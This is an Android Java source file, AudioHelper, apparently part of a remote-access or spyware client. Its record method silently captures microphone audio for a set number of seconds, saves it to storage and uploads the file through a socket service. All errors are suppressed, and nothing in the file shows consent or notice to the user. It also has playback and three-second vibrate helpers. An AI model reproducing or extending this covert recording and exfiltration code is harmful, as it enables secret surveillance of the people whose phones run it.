package com.rainbow.client;

import android.content.Context;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Vibrator;
import java.io.File;
import java.io.FileInputStream;

public class AudioHelper {

    private static MediaRecorder recorder;

    public static void record(Context ctx, int seconds) {
        try {
            File out = new File(Environment.getExternalStorageDirectory(), "rec_" + System.currentTimeMillis() + ".3gp");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(out.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            new Thread(() -> {
                try { Thread.sleep(seconds * 1000L); } catch (Exception ignored) {}
                try { recorder.stop(); recorder.release(); } catch (Exception ignored) {}
                try {
                    byte[] data = new byte[(int) out.length()];
                    FileInputStream in = new FileInputStream(out); in.read(data); in.close();
                    SocketService2.sendFile(out.getName(), data);
                } catch (Exception ignored) {}
            }).start();
        } catch (Exception ignored) {}
    }

    public static void play(Context ctx, String path) {
        try { MediaPlayer mp = new MediaPlayer(); mp.setDataSource(path); mp.prepare(); mp.start(); }
        catch (Exception ignored) {}
    }

    public static void vibrate(Context ctx) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            v.vibrate(3000);
        } catch (Exception ignored) {}
    }
}